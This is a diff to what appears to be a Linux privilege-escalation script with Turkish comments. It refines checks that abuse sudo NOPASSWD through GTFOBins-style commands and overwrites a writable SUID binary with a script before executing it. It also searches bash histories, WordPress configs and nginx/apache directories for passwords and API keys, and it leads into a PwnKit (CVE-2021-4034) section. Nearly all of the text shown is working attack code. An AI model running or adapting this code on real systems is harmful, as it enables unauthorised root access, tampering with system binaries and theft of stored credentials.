@@ -410,7 +410,14 @@ if { [ -w /etc/sudoers ] || [ -w /etc/sudoers.d ]; } && [ "$(id -u)" != "0" ]; t
 fi
 
 # --- Misconfig: sudo gtfo-bins ---
-SUDO_CMDS=$(sudo -n -l 2>/dev/null)
+SUDO_CMDS=""
+if command -v sudo >/dev/null 2>&1; then
+    if command -v timeout >/dev/null 2>&1; then
+        SUDO_CMDS=$(timeout 10 sudo -n -l 2>/dev/null)
+    else
+        SUDO_CMDS=$(sudo -n -l 2>/dev/null)
+    fi
+fi
 if echo "$SUDO_CMDS" | grep -qiE "NOPASSWD|\(ALL"; then
     note "sudo NOPASSWD -> gtfo-bin denemeleri"
     for e in 'find . -exec id \;' 'env id' 'bash -c id' 'sh -c id' 'tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=id'; do
@@ -421,8 +428,15 @@ if echo "$SUDO_CMDS" | grep -qiE "NOPASSWD|\(ALL"; then
     done
 fi
 
-# --- Misconfig: yazilabilir SUID binary ---
-WSUID=$(find / -perm -4000 -type f 2>/dev/null | while read -r f; do [ -w "$f" ] && echo "$f" && break; done)
+# --- Misconfig: yazilabilir SUID binary (timeout'lu, sadece sistem dizinleri) ---
+WSUID=""
+if command -v timeout >/dev/null 2>&1; then
+    for d in /usr/bin /usr/sbin /bin /sbin /usr/local/bin /usr/local/sbin /opt /var/www; do
+        [ -d "$d" ] || continue
+        f=$(timeout 8 find "$d" -xdev -perm -4000 -type f 2>/dev/null | while read -r x; do [ -w "$x" ] && echo "$x" && break; done)
+        [ -n "$f" ] && WSUID="$f" && break
+    done
+fi
 if [ -n "$WSUID" ] && [ "$(id -u)" != "0" ]; then
     note "yazilabilir SUID binary: $WSUID"
     run "cp '$WSUID' /tmp/.sb 2>/dev/null; printf '#!/bin/sh\nid\n' > '$WSUID' && chmod 4755 '$WSUID' && '$WSUID'" "suid-yazilabilir" 20 "true"
@@ -455,7 +469,11 @@ if [ -r /etc/shadow ]; then
 fi
 if [ "$(id -u)" != "0" ]; then
     note "sifre/anahtar taramasi"
-    grep -rIlE "password|passwd|api[_-]?key|secret" /root/.bash_history /home/*/.bash_history /var/www/html/wp-config.php /var/www/*/wp-config.php /etc/nginx/ /etc/apache2/ 2>/dev/null | head -5 | sed 's/^/    /'
+    if command -v timeout >/dev/null 2>&1; then
+        timeout 10 grep -rIlE "password|passwd|api[_-]?key|secret" /root/.bash_history /home/*/.bash_history /var/www/html/wp-config.php /var/www/*/wp-config.php /etc/nginx/ /etc/apache2/ 2>/dev/null | head -5 | sed 's/^/    /'
+    else
+        grep -rIlE "password|passwd|api[_-]?key|secret" /root/.bash_history /home/*/.bash_history /var/www/html/wp-config.php /var/www/*/wp-config.php /etc/nginx/ /etc/apache2/ 2>/dev/null | head -5 | sed 's/^/    /'
+    fi
 fi
 
 # --- PwnKit (CVE-2021-4034) ---
